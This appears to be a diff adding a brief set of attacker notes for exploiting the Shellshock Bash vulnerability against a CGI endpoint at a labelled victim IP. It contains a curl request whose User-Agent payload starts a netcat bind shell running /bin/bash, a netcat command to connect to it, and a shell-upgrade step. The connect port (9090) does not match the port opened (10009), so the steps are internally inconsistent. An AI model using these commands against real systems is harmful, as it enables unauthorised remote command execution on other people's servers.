@@ -1,0 +1,14 @@
+##Open port using shellshock vuln (shell 1)
+## 192.168.47.209 Victim's IP
+
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/bash -c "nc -lvkp 10009 -e /bin/bash"' http://192.168.47.209/cgi-bin/status  
+
+
+##Connect to port (shell 2)
+
+nc 192.168.47.209 9090
+
+##Get Interactive shell 
+
+script -qc /bin/bash /dev/null
+
